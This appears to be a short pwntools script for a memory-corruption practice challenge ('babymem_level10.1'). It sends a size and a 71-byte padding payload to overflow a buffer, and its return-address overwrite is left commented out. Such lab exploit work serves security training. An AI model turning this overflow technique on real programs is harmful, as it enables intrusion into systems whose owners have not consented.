
import pwn

proc = pwn.process("/challenge/babymem_level10.1")
proc.recvuntil("size:")
proc.sendline("71")
#ret_addr = pwn.p64(0x4016a6, endian='little')
payload = b"a"*71 #+ ret_addr
proc.recvuntil("bytes)!")
proc.send(payload)
proc.interactive()
